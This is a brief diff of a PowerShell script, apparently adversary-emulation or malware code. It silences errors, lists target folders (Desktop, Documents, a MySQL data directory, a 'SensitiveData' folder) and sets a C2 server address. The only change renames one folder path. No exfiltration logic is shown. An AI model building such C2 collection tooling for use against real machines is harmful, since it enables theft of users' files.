@@ -4,7 +4,7 @@ $ErrorActionPreference = "SilentlyContinue";
 $WarningPreference = "SilentlyContinue";
 
 # Variables
-$Directory = @("C:\xampp\mysql\data\","$($env:USERPROFILE)\Desktop","$($env:USERPROFILE)\Documents","C:\MWG_SensitiveData\");
+$Directory = @("C:\xampp\mysql\data\","$($env:USERPROFILE)\Desktop","$($env:USERPROFILE)\Documents","C:\SensitiveData\");
 $C2Server = "192.168.40.11";
 
 # Proxy Aware
